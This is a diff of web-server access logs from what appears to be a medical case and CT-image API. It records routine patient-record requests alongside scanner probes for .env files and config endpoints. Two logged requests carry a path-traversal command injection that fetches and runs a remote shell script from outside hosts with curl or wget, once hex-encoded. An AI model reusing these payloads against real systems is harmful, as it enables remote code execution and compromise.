-[pid: 2313|app: 0|req: 41/116] 219.239.227.174 () {40 vars in 835 bytes} [Wed Apr 17 21:35:37 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 196 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 1)
-[pid: 2313|app: 0|req: 41/117] 219.239.227.174 () {40 vars in 853 bytes} [Wed Apr 17 21:35:37 2024] GET /api/medical/get_ct?patient_id=6&case_id=19 => generated 28737 bytes in 203 msecs (HTTP/1.1 200) 7 headers in 215 bytes (1 switches on core 0)
+[pid: 1552743|app: 0|req: 20/62] 219.239.227.174 () {42 vars in 859 bytes} [Tue May  7 23:13:06 2024] GET /api/medical/get_case?patient_id=3 => generated 227 bytes in 92 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 1)
 用户id  : 5
+[pid: 1552742|app: 0|req: 24/63] 219.239.227.174 () {42 vars in 861 bytes} [Tue May  7 23:13:07 2024] GET /api/medical/get_case?patient_id=11 => generated 227 bytes in 101 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
 用户id  : 5
-[pid: 2312|app: 0|req: 41/118] 219.239.227.174 () {40 vars in 835 bytes} [Wed Apr 17 21:35:48 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 188 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
-[pid: 2312|app: 0|req: 41/119] 219.239.227.174 () {40 vars in 853 bytes} [Wed Apr 17 21:35:48 2024] GET /api/medical/get_ct?patient_id=6&case_id=19 => generated 28737 bytes in 194 msecs (HTTP/1.1 200) 7 headers in 215 bytes (1 switches on core 1)
-[pid: 2313|app: 0|req: 42/120] 219.239.227.140 () {46 vars in 840 bytes} [Wed Apr 17 21:47:57 2024] POST /api/user/login => generated 296 bytes in 92 msecs (HTTP/1.1 200) 9 headers in 303 bytes (1 switches on core 1)
+[pid: 1552740|app: 0|req: 7/64] 219.239.227.174 () {42 vars in 861 bytes} [Tue May  7 23:13:08 2024] GET /api/medical/get_case?patient_id=10 => generated 227 bytes in 93 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
 用户id  : 5
-[pid: 2313|app: 0|req: 43/121] 219.239.227.140 () {42 vars in 895 bytes} [Wed Apr 17 21:47:57 2024] GET /api/medical/get_all_patient => generated 1392 bytes in 322 msecs (HTTP/1.1 200) 7 headers in 214 bytes (1 switches on core 0)
-用户id  : 5
-[pid: 2310|app: 0|req: 13/122] 219.239.227.140 () {42 vars in 906 bytes} [Wed Apr 17 21:47:57 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 2954 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
-用户id  : 5
-[pid: 2309|app: 0|req: 26/123] 219.239.227.140 () {42 vars in 906 bytes} [Wed Apr 17 21:48:21 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 94 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 1)
-用户id  : 5
-[pid: 2310|app: 0|req: 14/124] 219.239.227.140 () {42 vars in 906 bytes} [Wed Apr 17 21:48:22 2024] GET /api/medical/get_case?patient_id=1 => generated 1689 bytes in 94 msecs (HTTP/1.1 200) 7 headers in 214 bytes (1 switches on core 1)
-用户id  : 5
-[pid: 2309|app: 0|req: 27/125] 219.239.227.140 () {42 vars in 906 bytes} [Wed Apr 17 21:48:23 2024] GET /api/medical/get_case?patient_id=3 => generated 241 bytes in 98 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
-用户id  : 5
-[pid: 2309|app: 0|req: 28/126] 219.239.227.140 () {42 vars in 906 bytes} [Wed Apr 17 21:48:24 2024] GET /api/medical/get_case?patient_id=7 => generated 74 bytes in 92 msecs (HTTP/1.1 200) 7 headers in 212 bytes (1 switches on core 1)
-用户id  : 5
-[pid: 2310|app: 0|req: 15/127] 219.239.227.140 () {42 vars in 906 bytes} [Wed Apr 17 21:48:25 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 94 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
-用户id  : 5
-[pid: 2310|app: 0|req: 16/128] 219.239.227.140 () {42 vars in 912 bytes} [Wed Apr 17 21:48:26 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 111 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 1)
-用户id  : 5
-[pid: 2312|app: 0|req: 42/129] 219.239.227.140 () {42 vars in 930 bytes} [Wed Apr 17 21:48:26 2024] GET /api/medical/get_ct?patient_id=6&case_id=19 => generated 28737 bytes in 128 msecs (HTTP/1.1 200) 7 headers in 215 bytes (1 switches on core 0)
-[pid: 2312|app: 0|req: 43/130] 219.239.227.140 () {46 vars in 772 bytes} [Wed Apr 17 21:49:27 2024] POST /api/user/login => generated 296 bytes in 802 msecs (HTTP/1.1 200) 9 headers in 303 bytes (1 switches on core 1)
-用户id  : 5
-[pid: 2313|app: 0|req: 44/131] 219.239.227.140 () {42 vars in 827 bytes} [Wed Apr 17 21:49:28 2024] GET /api/medical/get_all_patient => generated 1392 bytes in 106 msecs (HTTP/1.1 200) 7 headers in 214 bytes (1 switches on core 1)
-用户id  : 5
-[pid: 2313|app: 0|req: 45/132] 219.239.227.140 () {42 vars in 838 bytes} [Wed Apr 17 21:49:28 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 3397 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
-用户id  : 5
-用户id  : 5
-[pid: 2312|app: 0|req: 44/133] 219.239.227.140 () {42 vars in 844 bytes} [Wed Apr 17 21:49:36 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 2274 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
-[pid: 2309|app: 0|req: 29/134] 219.239.227.140 () {42 vars in 862 bytes} [Wed Apr 17 21:49:36 2024] GET /api/medical/get_ct?patient_id=6&case_id=19 => generated 28737 bytes in 4671 msecs (HTTP/1.1 200) 7 headers in 215 bytes (1 switches on core 0)
-Not Found: /api/session/properties
-[pid: 2313|app: 0|req: 46/135] 45.156.129.12 () {36 vars in 542 bytes} [Fri Apr 19 04:24:07 2024] GET /api/session/properties => generated 2490 bytes in 21 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 1)
-[pid: 2313|app: 0|req: 47/136] 219.239.227.192 () {48 vars in 827 bytes} [Fri Apr 19 22:03:58 2024] OPTIONS /api/user/login => generated 0 bytes in 0 msecs (HTTP/1.1 200) 11 headers in 563 bytes (1 switches on core 0)
-[pid: 2312|app: 0|req: 45/137] 219.239.227.192 () {46 vars in 814 bytes} [Fri Apr 19 22:03:58 2024] POST /api/user/login => generated 59 bytes in 97 msecs (HTTP/1.1 200) 9 headers in 304 bytes (1 switches on core 1)
-[pid: 2313|app: 0|req: 48/138] 219.239.227.192 () {46 vars in 814 bytes} [Fri Apr 19 22:04:01 2024] POST /api/user/login => generated 296 bytes in 101 msecs (HTTP/1.1 200) 9 headers in 305 bytes (1 switches on core 1)
-[pid: 2313|app: 0|req: 49/139] 219.239.227.192 () {48 vars in 853 bytes} [Fri Apr 19 22:04:01 2024] OPTIONS /api/medical/get_all_patient => generated 0 bytes in 0 msecs (HTTP/1.1 200) 11 headers in 563 bytes (1 switches on core 0)
-用户id  : 5
-[pid: 2313|app: 0|req: 50/140] 219.239.227.192 () {44 vars in 896 bytes} [Fri Apr 19 22:04:01 2024] GET /api/medical/get_all_patient => generated 1392 bytes in 104 msecs (HTTP/1.1 200) 9 headers in 306 bytes (1 switches on core 1)
-[pid: 2313|app: 0|req: 51/141] 219.239.227.192 () {48 vars in 864 bytes} [Fri Apr 19 22:04:02 2024] OPTIONS /api/medical/get_case?patient_id=6 => generated 0 bytes in 0 msecs (HTTP/1.1 200) 11 headers in 563 bytes (1 switches on core 0)
-用户id  : 5
-[pid: 2310|app: 0|req: 17/142] 219.239.227.192 () {44 vars in 907 bytes} [Fri Apr 19 22:04:02 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 96 msecs (HTTP/1.1 200) 9 headers in 305 bytes (1 switches on core 0)
-[pid: 2309|app: 0|req: 31/143] 219.239.227.192 () {48 vars in 882 bytes} [Fri Apr 19 22:04:04 2024] OPTIONS /api/medical/get_ct?patient_id=6&case_id=19 => generated 0 bytes in 1 msecs (HTTP/1.1 200) 11 headers in 563 bytes (1 switches on core 0)
-用户id  : 5
-[pid: 2309|app: 0|req: 31/144] 219.239.227.192 () {44 vars in 907 bytes} [Fri Apr 19 22:04:04 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 108 msecs (HTTP/1.1 200) 9 headers in 305 bytes (1 switches on core 1)
-用户id  : 5
-[pid: 2312|app: 0|req: 46/145] 219.239.227.192 () {44 vars in 925 bytes} [Fri Apr 19 22:04:04 2024] GET /api/medical/get_ct?patient_id=6&case_id=19 => generated 28737 bytes in 117 msecs (HTTP/1.1 200) 9 headers in 307 bytes (1 switches on core 0)
-Not Found: /api/session/properties
-[pid: 2313|app: 0|req: 52/146] 185.180.143.140 () {34 vars in 531 bytes} [Sat Apr 20 05:28:56 2024] GET /api/session/properties => generated 2489 bytes in 5 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 1)
+[pid: 1552743|app: 0|req: 21/65] 219.239.227.174 () {42 vars in 859 bytes} [Tue May  7 23:13:08 2024] GET /api/medical/get_case?patient_id=8 => generated 227 bytes in 94 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
 Not Found: /api/.env
-[pid: 2312|app: 0|req: 47/147] 216.24.210.40 () {36 vars in 523 bytes} [Sat Apr 20 23:43:53 2024] GET /api/.env => generated 2447 bytes in 97 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 1)
+[pid: 1552742|app: 0|req: 25/66] 92.205.160.111 () {36 vars in 577 bytes} [Tue May  7 23:18:29 2024] GET /api/.env => generated 2447 bytes in 19 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 1)
 Not Found: /api/.env
-[pid: 2310|app: 0|req: 18/148] 216.24.210.9 () {40 vars in 627 bytes} [Sat Apr 20 23:43:54 2024] POST /api/.env => generated 2448 bytes in 9 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 1)
-Not Found: /api/.env
-[pid: 2312|app: 0|req: 48/149] 216.24.210.23 () {38 vars in 542 bytes} [Sat Apr 20 23:44:03 2024] GET /api/.env => generated 2448 bytes in 5 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 0)
-Not Found: /api/.env
-[pid: 2313|app: 0|req: 53/150] 216.24.210.22 () {42 vars in 619 bytes} [Sat Apr 20 23:44:04 2024] POST /api/.env => generated 2449 bytes in 5 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 0)
-Not Found: /api/index.php/v1/config/application
-[pid: 2313|app: 0|req: 54/151] 216.24.210.10 () {36 vars in 600 bytes} [Sat Apr 20 23:46:16 2024] GET /api/index.php/v1/config/application?public=true => generated 2540 bytes in 5 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 1)
-Not Found: /api/index.php/v1/config/application
-[pid: 2310|app: 0|req: 19/152] 216.24.210.10 () {38 vars in 613 bytes} [Sat Apr 20 23:47:28 2024] GET /api/index.php/v1/config/application?public=true => generated 2541 bytes in 10 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 0)
-Not Found: /api/v1/license/keys-status/;curl http:/193.222.96.163/iv.sh | sh || wget -O- http:/193.222.96.163/iv.sh | sh;
-[pid: 2310|app: 0|req: 20/153] 92.118.39.120 () {38 vars in 795 bytes} [Mon Apr 22 05:36:05 2024] GET /api/v1/totp/user-backup-code/../../license/keys-status/%3bcurl%20http%3a%2f%2f193.222.96.163%2fiv.sh%20%7c%20sh%20%7c%7c%20wget%20-O-%20http%3a%2f%2f193.222.96.163%2fiv.sh%20%7c%20sh%3b => generated 2785 bytes in 17 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 1)
-Not Found: /api/v1/system/system-information
-[pid: 2313|app: 0|req: 55/154] 92.118.39.120 () {38 vars in 593 bytes} [Tue Apr 23 02:32:18 2024] GET /api/v1/totp/user-backup-code/../../system/system-information => generated 2524 bytes in 6 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 0)
-Not Found: /api/v1/system/maintenance/archiving/cloud-server-test-connection
-[pid: 2313|app: 0|req: 56/155] 92.118.39.120 () {42 vars in 738 bytes} [Tue Apr 23 02:32:18 2024] POST /api/v1/totp/user-backup-code/../../system/maintenance/archiving/cloud-server-test-connection => generated 2621 bytes in 5 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 1)
-Not Found: /api/v1/system/system-information
-[pid: 2313|app: 0|req: 57/156] 92.118.39.120 () {38 vars in 593 bytes} [Thu Apr 25 15:09:15 2024] GET /api/v1/totp/user-backup-code/../../system/system-information => generated 2524 bytes in 124 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 0)
-Not Found: /api/v1/system/maintenance/archiving/cloud-server-test-connection
-[pid: 2313|app: 0|req: 58/157] 92.118.39.120 () {42 vars in 738 bytes} [Thu Apr 25 15:09:15 2024] POST /api/v1/totp/user-backup-code/../../system/maintenance/archiving/cloud-server-test-connection => generated 2621 bytes in 5 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 1)
-Not Found: /api/v1/license/keys-status/;curl http:/94.156.79.60/iv.sh | sh || wget -O- http:/94.156.79.60/iv.sh | sh;
-[pid: 2310|app: 0|req: 21/158] 92.118.39.120 () {38 vars in 901 bytes} [Thu Apr 25 15:09:15 2024] GET /api/v1/totp/user-backup-code/../../license/keys-status/%3b%63%75%72%6c%20%68%74%74%70%3a%2f%2f%39%34%2e%31%35%36%2e%37%39%2e%36%30%2f%69%76%2e%73%68%20%7c%20%73%68%20%7c%7c%20%77%67%65%74%20%2d%4f%2d%20%68%74%74%70%3a%2f%2f%39%34%2e%31%35%36%2e%37%39%2e%36%30%2f%69%76%2e%73%68%20%7c%20%73%68%3b => generated 2773 bytes in 7 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 0)
-[pid: 2310|app: 0|req: 22/159] 219.239.227.174 () {44 vars in 763 bytes} [Sat Apr 27 20:50:51 2024] POST /api/user/login => generated 296 bytes in 2404 msecs (HTTP/1.1 200) 9 headers in 303 bytes (1 switches on core 1)
-用户id  : 5
-[pid: 2312|app: 0|req: 49/160] 219.239.227.174 () {40 vars in 822 bytes} [Sat Apr 27 20:50:54 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 7368 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 1)
-用户id  : 5
-[pid: 2312|app: 0|req: 50/161] 219.239.227.174 () {40 vars in 835 bytes} [Sat Apr 27 20:51:01 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 110 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
-用户id  : 5
-[pid: 2310|app: 0|req: 23/162] 219.239.227.174 () {40 vars in 853 bytes} [Sat Apr 27 20:51:01 2024] GET /api/medical/get_ct?patient_id=6&case_id=18 => generated 2117 bytes in 118 msecs (HTTP/1.1 200) 7 headers in 214 bytes (1 switches on core 0)
-[pid: 2312|app: 0|req: 51/163] 219.239.227.174 () {44 vars in 763 bytes} [Sat Apr 27 20:51:32 2024] POST /api/user/login => generated 296 bytes in 90 msecs (HTTP/1.1 200) 9 headers in 303 bytes (1 switches on core 1)
-用户id  : 5
-[pid: 2310|app: 0|req: 24/164] 219.239.227.174 () {40 vars in 822 bytes} [Sat Apr 27 20:51:32 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 93 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 1)
-用户id  : 5
-用户id  : 5
-[pid: 2313|app: 0|req: 60/165] 219.239.227.174 () {40 vars in 853 bytes} [Sat Apr 27 20:51:32 2024] GET /api/medical/get_ct?patient_id=6&case_id=18 => generated 2117 bytes in 191 msecs (HTTP/1.1 200) 7 headers in 214 bytes (1 switches on core 0)
-[pid: 2313|app: 0|req: 60/166] 219.239.227.174 () {40 vars in 835 bytes} [Sat Apr 27 20:51:32 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 191 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 1)
-用户id  : 5
-[pid: 2312|app: 0|req: 52/167] 219.239.227.174 () {40 vars in 818 bytes} [Sat Apr 27 20:51:40 2024] GET /api/medical/get_all_patient => generated 1392 bytes in 102 msecs (HTTP/1.1 200) 7 headers in 214 bytes (1 switches on core 0)
-用户id  : 5
-[pid: 2309|app: 0|req: 32/168] 219.239.227.174 () {40 vars in 829 bytes} [Sat Apr 27 20:51:41 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 93 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
-用户id  : 5
-[pid: 2312|app: 0|req: 53/169] 219.239.227.174 () {40 vars in 829 bytes} [Sat Apr 27 20:51:43 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 94 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 1)
-用户id  : 5
-用户id  : 5
-[pid: 2310|app: 0|req: 25/170] 219.239.227.174 () {40 vars in 835 bytes} [Sat Apr 27 20:51:45 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 113 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 0)
-[pid: 2309|app: 0|req: 33/171] 219.239.227.174 () {40 vars in 853 bytes} [Sat Apr 27 20:51:45 2024] GET /api/medical/get_ct?patient_id=6&case_id=19 => generated 28737 bytes in 122 msecs (HTTP/1.1 200) 7 headers in 215 bytes (1 switches on core 1)
-[pid: 2310|app: 0|req: 26/172] 219.239.227.174 () {46 vars in 925 bytes} [Sat Apr 27 20:51:57 2024] POST /api/medical/annotate => generated 146 bytes in 118 msecs (HTTP/1.1 200) 9 headers in 303 bytes (1 switches on core 1)
-[pid: 2312|app: 0|req: 54/173] 219.239.227.174 () {46 vars in 925 bytes} [Sat Apr 27 20:51:59 2024] POST /api/medical/annotate => generated 147 bytes in 89 msecs (HTTP/1.1 200) 9 headers in 303 bytes (1 switches on core 0)
-[pid: 2313|app: 0|req: 61/174] 219.239.227.174 () {46 vars in 925 bytes} [Sat Apr 27 20:52:00 2024] POST /api/medical/annotate => generated 146 bytes in 87 msecs (HTTP/1.1 200) 9 headers in 303 bytes (1 switches on core 1)
-用户id  : 5
-用户id  : 5
-[pid: 2309|app: 0|req: 35/175] 219.239.227.174 () {40 vars in 835 bytes} [Sat Apr 27 20:52:16 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 94 msecs (HTTP/1.1 200) 7 headers in 213 bytes (1 switches on core 1)
-[pid: 2309|app: 0|req: 35/176] 219.239.227.174 () {40 vars in 853 bytes} [Sat Apr 27 20:52:16 2024] GET /api/medical/get_ct?patient_id=6&case_id=19 => generated 28737 bytes in 103 msecs (HTTP/1.1 200) 7 headers in 215 bytes (1 switches on core 0)
-[pid: 2313|app: 0|req: 62/177] 219.239.227.174 () {46 vars in 925 bytes} [Sat Apr 27 20:53:15 2024] POST /api/medical/annotate => generated 146 bytes in 87 msecs (HTTP/1.1 200) 9 headers in 303 bytes (1 switches on core 0)
-[pid: 2313|app: 0|req: 63/178] 219.239.227.174 () {46 vars in 925 bytes} [Sat Apr 27 20:53:20 2024] POST /api/medical/annotate => generated 147 bytes in 87 msecs (HTTP/1.1 200) 9 headers in 303 bytes (1 switches on core 1)
-[pid: 2310|app: 0|req: 27/179] 219.239.227.174 () {46 vars in 925 bytes} [Sat Apr 27 20:53:27 2024] POST /api/medical/annotate => generated 146 bytes in 87 msecs (HTTP/1.1 200) 9 headers in 303 bytes (1 switches on core 0)
-[pid: 2312|app: 0|req: 55/180] 219.239.227.192 () {48 vars in 832 bytes} [Sat Apr 27 21:12:04 2024] OPTIONS /api/user/login => generated 0 bytes in 1 msecs (HTTP/1.1 200) 11 headers in 563 bytes (1 switches on core 1)
-[pid: 2310|app: 0|req: 28/181] 219.239.227.192 () {46 vars in 819 bytes} [Sat Apr 27 21:12:04 2024] POST /api/user/login => generated 296 bytes in 90 msecs (HTTP/1.1 200) 9 headers in 305 bytes (1 switches on core 1)
-[pid: 2312|app: 0|req: 56/182] 219.239.227.192 () {48 vars in 869 bytes} [Sat Apr 27 21:12:04 2024] OPTIONS /api/medical/get_case?patient_id=1 => generated 0 bytes in 1 msecs (HTTP/1.1 200) 11 headers in 563 bytes (1 switches on core 0)
-用户id  : 5
-[pid: 2312|app: 0|req: 57/183] 219.239.227.192 () {44 vars in 912 bytes} [Sat Apr 27 21:12:04 2024] GET /api/medical/get_case?patient_id=1 => generated 1689 bytes in 95 msecs (HTTP/1.1 200) 9 headers in 306 bytes (1 switches on core 1)
-[pid: 2313|app: 0|req: 65/184] 219.239.227.192 () {48 vars in 885 bytes} [Sat Apr 27 21:12:04 2024] OPTIONS /api/medical/get_ct?patient_id=1&case_id=1 => generated 0 bytes in 1 msecs (HTTP/1.1 200) 11 headers in 563 bytes (1 switches on core 1)
-用户id  : 5
-[pid: 2313|app: 0|req: 65/185] 219.239.227.192 () {44 vars in 912 bytes} [Sat Apr 27 21:12:04 2024] GET /api/medical/get_case?patient_id=1 => generated 1689 bytes in 117 msecs (HTTP/1.1 200) 9 headers in 306 bytes (1 switches on core 0)
-用户id  : 5
-[pid: 2309|app: 0|req: 36/186] 219.239.227.192 () {44 vars in 928 bytes} [Sat Apr 27 21:12:04 2024] GET /api/medical/get_ct?patient_id=1&case_id=1 => generated 421 bytes in 119 msecs (HTTP/1.1 200) 9 headers in 305 bytes (1 switches on core 1)
-[pid: 2313|app: 0|req: 66/187] 219.239.227.192 () {46 vars in 819 bytes} [Sat Apr 27 21:12:09 2024] POST /api/user/login => generated 73 bytes in 0 msecs (HTTP/1.1 200) 9 headers in 304 bytes (1 switches on core 1)
-[pid: 2309|app: 0|req: 37/188] 219.239.227.192 () {46 vars in 819 bytes} [Sat Apr 27 21:12:16 2024] POST /api/user/login => generated 296 bytes in 92 msecs (HTTP/1.1 200) 9 headers in 305 bytes (1 switches on core 0)
-[pid: 2312|app: 0|req: 58/189] 219.239.227.192 () {48 vars in 858 bytes} [Sat Apr 27 21:12:16 2024] OPTIONS /api/medical/get_all_patient => generated 0 bytes in 0 msecs (HTTP/1.1 200) 11 headers in 563 bytes (1 switches on core 0)
-用户id  : 5
-[pid: 2312|app: 0|req: 59/190] 219.239.227.192 () {44 vars in 901 bytes} [Sat Apr 27 21:12:16 2024] GET /api/medical/get_all_patient => generated 1392 bytes in 104 msecs (HTTP/1.1 200) 9 headers in 306 bytes (1 switches on core 1)
-[pid: 2312|app: 0|req: 60/191] 219.239.227.192 () {48 vars in 869 bytes} [Sat Apr 27 21:12:16 2024] OPTIONS /api/medical/get_case?patient_id=6 => generated 0 bytes in 0 msecs (HTTP/1.1 200) 11 headers in 563 bytes (1 switches on core 0)
-用户id  : 5
-[pid: 2312|app: 0|req: 61/192] 219.239.227.192 () {44 vars in 912 bytes} [Sat Apr 27 21:12:16 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 100 msecs (HTTP/1.1 200) 9 headers in 305 bytes (1 switches on core 1)
-用户id  : 5
-[pid: 2312|app: 0|req: 62/193] 219.239.227.192 () {44 vars in 912 bytes} [Sat Apr 27 21:12:18 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 91 msecs (HTTP/1.1 200) 9 headers in 305 bytes (1 switches on core 0)
-[pid: 2313|app: 0|req: 67/194] 219.239.227.192 () {48 vars in 887 bytes} [Sat Apr 27 21:12:18 2024] OPTIONS /api/medical/get_ct?patient_id=6&case_id=19 => generated 0 bytes in 0 msecs (HTTP/1.1 200) 11 headers in 563 bytes (1 switches on core 1)
-用户id  : 5
-[pid: 2312|app: 0|req: 63/195] 219.239.227.192 () {44 vars in 912 bytes} [Sat Apr 27 21:12:18 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 113 msecs (HTTP/1.1 200) 9 headers in 305 bytes (1 switches on core 1)
-用户id  : 5
-[pid: 2313|app: 0|req: 68/196] 219.239.227.192 () {44 vars in 930 bytes} [Sat Apr 27 21:12:18 2024] GET /api/medical/get_ct?patient_id=6&case_id=19 => generated 28737 bytes in 118 msecs (HTTP/1.1 200) 9 headers in 307 bytes (1 switches on core 0)
-用户id  : 5
-用户id  : 5
-[pid: 2310|app: 0|req: 30/197] 219.239.227.192 () {44 vars in 912 bytes} [Sat Apr 27 21:14:03 2024] GET /api/medical/get_case?patient_id=6 => generated 382 bytes in 183 msecs (HTTP/1.1 200) 9 headers in 305 bytes (1 switches on core 1)
-[pid: 2310|app: 0|req: 30/198] 219.239.227.192 () {44 vars in 930 bytes} [Sat Apr 27 21:14:03 2024] GET /api/medical/get_ct?patient_id=6&case_id=19 => generated 28737 bytes in 189 msecs (HTTP/1.1 200) 9 headers in 307 bytes (1 switches on core 0)
-Not Found: /api/.env
-[pid: 2313|app: 0|req: 69/199] 203.55.81.13 () {34 vars in 420 bytes} [Mon Apr 29 06:08:16 2024] GET /api/.env => generated 2447 bytes in 19 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 1)
-Not Found: /api/.env
-[pid: 2310|app: 0|req: 31/200] 203.55.81.13 () {34 vars in 420 bytes} [Tue Apr 30 14:40:33 2024] GET /api/.env => generated 2447 bytes in 6 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 1)
-Not Found: /api/.env
-[pid: 2312|app: 0|req: 64/201] 203.55.81.13 () {34 vars in 420 bytes} [Wed May  1 01:17:54 2024] GET /api/.env => generated 2447 bytes in 6 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 0)
-Not Found: /api
-[pid: 2313|app: 0|req: 70/202] 121.43.119.65 () {38 vars in 649 bytes} [Wed May  1 02:57:32 2024] GET /api => generated 2432 bytes in 5 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 0)
-Not Found: /api-docs
-[pid: 2313|app: 0|req: 71/203] 121.43.119.65 () {38 vars in 659 bytes} [Wed May  1 02:57:40 2024] GET /api-docs => generated 2447 bytes in 5 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 1)
-Not Found: /api/systeminfo
-[pid: 2312|app: 0|req: 65/204] 121.43.119.65 () {38 vars in 671 bytes} [Wed May  1 02:57:43 2024] GET /api/systeminfo => generated 2465 bytes in 5 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 1)
-Not Found: /api/v1/query
-[pid: 2312|app: 0|req: 66/205] 121.43.119.65 () {38 vars in 722 bytes} [Wed May  1 02:57:55 2024] GET /api/v1/query?query=prometheus_build_info => generated 2487 bytes in 5 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 0)
-Not Found: /api.php
-[pid: 2313|app: 0|req: 72/206] 121.43.119.65 () {38 vars in 657 bytes} [Wed May  1 02:58:39 2024] GET /api.php => generated 2444 bytes in 5 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 0)
-Not Found: /api/avatar/defaultx20.jpg
-[pid: 2313|app: 0|req: 73/207] 121.43.119.65 () {38 vars in 693 bytes} [Wed May  1 02:59:33 2024] GET /api/avatar/defaultx20.jpg => generated 2498 bytes in 5 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 1)
-Not Found: /api/ad/v2/version
-[pid: 2310|app: 0|req: 32/208] 121.43.119.65 () {38 vars in 677 bytes} [Wed May  1 02:59:51 2024] GET /api/ad/v2/version => generated 2474 bytes in 5 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 0)
-Not Found: /api/v1/status/system-info
-[pid: 2309|app: 0|req: 38/209] 121.43.119.65 () {38 vars in 693 bytes} [Wed May  1 03:00:31 2024] GET /api/v1/status/system-info => generated 2498 bytes in 236 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 1)
-Not Found: /api/count.php
-[pid: 2309|app: 0|req: 39/210] 121.43.119.65 () {38 vars in 669 bytes} [Wed May  1 03:01:06 2024] GET /api/count.php => generated 2462 bytes in 5 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 0)
-Not Found: /api/get_keywords.php
-[pid: 2312|app: 0|req: 67/211] 121.43.119.65 () {38 vars in 683 bytes} [Wed May  1 03:01:09 2024] GET /api/get_keywords.php => generated 2483 bytes in 5 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 1)
-Not Found: /api/.env
-[pid: 2312|app: 0|req: 68/212] 203.55.81.13 () {34 vars in 420 bytes} [Wed May  1 03:27:33 2024] GET /api/.env => generated 2447 bytes in 5 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 0)
-Not Found: /api/.env
-[pid: 2312|app: 0|req: 69/213] 203.55.81.13 () {34 vars in 420 bytes} [Wed May  1 05:17:22 2024] GET /api/.env => generated 2447 bytes in 5 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 1)
-Not Found: /api/.env
-[pid: 2313|app: 0|req: 74/214] 203.55.81.13 () {34 vars in 420 bytes} [Wed May  1 08:09:31 2024] GET /api/.env => generated 2447 bytes in 5 msecs (HTTP/1.1 404) 7 headers in 229 bytes (1 switches on core 0)
-Not Found: /api
